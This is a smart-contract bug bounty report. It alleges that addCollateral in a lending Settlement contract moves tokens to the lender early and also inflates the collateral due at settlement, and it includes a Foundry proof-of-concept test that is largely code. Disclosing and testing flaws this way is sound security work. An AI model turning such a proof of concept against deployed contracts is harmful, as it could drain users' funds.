# #47112 \[SC-Critical] addCollateral causes double economic loss through premature asset transfer and inflated settlement requirements

**Submitted on Jun 9th 2025 at 02:46:06 UTC by @Catchme for** [**IOP | Term Structure Institutional**](https://immunefi.com/audit-competition/iop-term-structure)

* **Report ID:** #47112
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/term-structure/tsi-contract/blob/main/src/Settlement.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `addCollateral` function in the Settlement contract suffers from a critical vulnerability that causes both premature asset transfer and settlement amount inflation, resulting in double economic loss. If exploited in production, this would lead to significant financial losses for users adding collateral to unsettled loans, as tokens would be transferred immediately to lenders while simultaneously increasing the settlement requirements, effectively forcing the same value to be paid twice.

## Vulnerability Details

1. Immediate Asset Transfer: The `addCollateral` method immediately transfers collateral tokens to the lender, even for unsettled loans:

```
function addCollateral(string memory _loanId, uint256 addCollateralAmt) external nonReentrant {
    // ...
    loanInfo.addCollateral(addCollateralAmt);  // Increases recorded collateral amount
    loans[loanId] = loanInfo;
    
    // Immediate transfer to lender regardless of settlement status
    IERC20(loanInfo.collateralTokenAddr).safeTransferFrom(msg.sender, loanInfo.lender, addCollateralAmt);
    // ...
}
```

2. State Inflation: The `LoanLib.addCollateral` method increases the recorded collateral amount:

```
function addCollateral(LoanInfo memory loanInfo, uint256 collateralAmt) internal pure {
    loanInfo.debtData.collateralAmt += collateralAmt;  // Inflates total collateral requirement
}
```

3. Settlement Double-Transfer: During settlement, the borrower must transfer the entire recorded collateral amount, which now includes previously transferred tokens:

```
function settle(string memory _loanId) public nonReentrant {
    // ...
    IERC20(loanInfo.collateralTokenAddr).safeTransferFrom(
        loanInfo.borrower, loanInfo.lender, loanInfo.debtData.collateralAmt  // Transfers inflated amount
    );
    // ...
}
```

Logical Flaw: The system assumes collateral should only be transferred during settlement as an atomic operation, but addCollateral violates this principle by transferring assets immediately while simultaneously inflating future settlement requirements.

## Impact Details

This vulnerability creates severe economic consequences for multiple parties:

1. **Direct Financial Loss to Callers:**
   * Any address calling `addCollateral()` loses their tokens immediately with no compensation
   * These users transfer tokens to lenders without establishing proper custodial relationships
   * In production, this could lead to significant financial losses proportional to added collateral amounts
2. **Inflated Settlement Costs for Borrowers:**
   * Borrowers must transfer additional collateral during settlement equal to all previous `addCollateral` amounts
   * Original loan terms become economically disadvantageous beyond agreed parameters
   * Settlement becomes unpredictably more expensive than initially calculated

## Proof of Concept

## Proof of Concept

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../src/Settlement.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockOracle is IOracle {
    function getPrice(address token) external pure override returns (PriceInfo memory) {
        return PriceInfo({
            price: 1e18,
            timestamp: block.timestamp,
            source: "MOCK"
        });
    }
}

contract AddCollateralDoubleSpendingPOC is Test {
    Settlement settlement;
    MockERC20 collateralToken;
    MockERC20 debtToken;
    MockOracle oracle;
    
    address admin = address(1);
    address feeCollector = address(2);
    address operator = address(3);
    address lender = address(4);
    address borrower = address(5);
    address thirdParty = address(6);
    
    uint256 initialCollateral = 100 * 10**18; // 100 tokens
    uint256 additionalCollateral = 10 * 10**18; // 10 tokens
    uint256 borrowAmount = 80 * 10**18; // 80 tokens
    bytes32 settlementId;
    bytes32 loanId;
    
    function setUp() public {
        // Deploy tokens
        collateralToken = new MockERC20("Collateral Token", "CTK");
        debtToken = new MockERC20("Debt Token", "DTK");
        oracle = new MockOracle();
        
        // Deploy settlement contract
        settlement = new Settlement(admin, feeCollector, operator, address(oracle));
        
        // Distribute tokens
        collateralToken.transfer(borrower, 500 * 10**18);
        collateralToken.transfer(thirdParty, 100 * 10**18);
        debtToken.transfer(lender, 500 * 10**18);
        
        // Set up approvals
        vm.startPrank(borrower);
        collateralToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(lender);
        debtToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(thirdParty);
        collateralToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        // Create settlement and loan structures
        string memory settlementIdStr = "test-settlement";
        string memory loanIdStr = "test-loan";
        settlementId = bytes32(bytes(settlementIdStr));
        loanId = bytes32(bytes(loanIdStr));
        
        // Setup loan details through createSettlement
        setupLoan(settlementIdStr, loanIdStr);
    }
    
    function setupLoan(string memory settlementIdStr, string memory loanIdStr) internal {
        string[] memory loanIds = new string[](1);
        loanIds[0] = loanIdStr;
        
        LoanInfo[] memory loanInfos = new LoanInfo[](1);
        DebtData memory debtData = DebtData({
            borrowedAmt: borrowAmount,
            debtAmt: borrowAmount,
            feeAmt: 0,
            collateralAmt: initialCollateral
        });
        
        loanInfos[0] = LoanInfo({
            maker: lender,
            borrower: borrower,
            lender: lender,
            debtTokenAddr: address(debtToken),
            collateralTokenAddr: address(collateralToken),
            settlementId: bytes32(0),
            debtData: debtData,
            settled: false
        });
        
        SettleInfo memory settleInfo = SettleInfo({
            taker: borrower,
            takerType: TakerType.BORROW,
            expiryTime: block.timestamp + 1 days
        });
        
        // Generate signature (mocked for simplicity)
        bytes memory signature = abi.encodePacked(
            bytes32(0x12345678),
            bytes32(0x12345678),
            uint8(27)
        );
        
        // Create settlement as borrower
        vm.startPrank(borrower);
        vm.mockCall(
            address(operator),
            abi.encodeWithSelector(SignatureChecker.isValidSignatureNow.selector),
            abi.encode(true)
        );
        settlement.createSettlement(settlementIdStr, settleInfo, loanIds, loanInfos, signature);
        vm.stopPrank();
    }
    
    function testAddCollateralDoubleTransfer() public {
        string memory loanIdStr = "test-loan";
        
        // Record balances before operations
        uint256 thirdPartyInitialBalance = collateralToken.balanceOf(thirdParty);
        uint256 lenderInitialBalance = collateralToken.balanceOf(lender);
        uint256 borrowerInitialBalance = collateralToken.balanceOf(borrower);
        
        console.log("Initial balances:");
        console.log("Third party:", thirdPartyInitialBalance);
        console.log("Lender:", lenderInitialBalance);
        console.log("Borrower:", borrowerInitialBalance);
        
        // Third party adds collateral before loan is settled
        vm.startPrank(thirdParty);
        settlement.addCollateral(loanIdStr, additionalCollateral);
        vm.stopPrank();
        
        // Check balances after addCollateral
        uint256 thirdPartyAfterAddCollateral = collateralToken.balanceOf(thirdParty);
        uint256 lenderAfterAddCollateral = collateralToken.balanceOf(lender);
        
        console.log("\nBalances after addCollateral:");
        console.log("Third party:", thirdPartyAfterAddCollateral);
        console.log("Lender:", lenderAfterAddCollateral);
        
        // Verify third party lost tokens immediately
        assertEq(
            thirdPartyAfterAddCollateral, 
            thirdPartyInitialBalance - additionalCollateral,
            "Third party should lose tokens immediately"
        );
        
        // Verify lender received tokens immediately
        assertEq(
            lenderAfterAddCollateral, 
            lenderInitialBalance + additionalCollateral,
            "Lender should receive tokens immediately"
        );
        
        // Now perform settlement
        vm.startPrank(lender);
        settlement.settle(loanIdStr);
        vm.stopPrank();
        
        // Check final balances
        uint256 borrowerAfterSettle = collateralToken.balanceOf(borrower);
        uint256 lenderAfterSettle = collateralToken.balanceOf(lender);
        
        console.log("\nBalances after settlement:");
        console.log("Borrower:", borrowerAfterSettle);
        console.log("Lender:", lenderAfterSettle);
        
        // Verify borrower paid inflated amount (initial + additional)
        assertEq(
            borrowerAfterSettle, 
            borrowerInitialBalance - (initialCollateral + additionalCollateral),
            "Borrower should pay inflated collateral amount including the additional collateral"
        );
        
        // Verify lender received double benefit
        assertEq(
            lenderAfterSettle, 
            lenderInitialBalance + additionalCollateral + initialCollateral + additionalCollateral,
            "Lender receives double benefit: once from addCollateral and again during settlement"
        );
        
        // Calculate total economic loss
        uint256 totalEconomicLoss = additionalCollateral * 2;
        console.log("\nTotal economic impact:");
        console.log("Third party lost:", additionalCollateral);
        console.log("Borrower overpaid by:", additionalCollateral);
        console.log("Lender gained extra:", additionalCollateral);
        console.log("Total economic distortion:", totalEconomicLoss);
    }
}
```
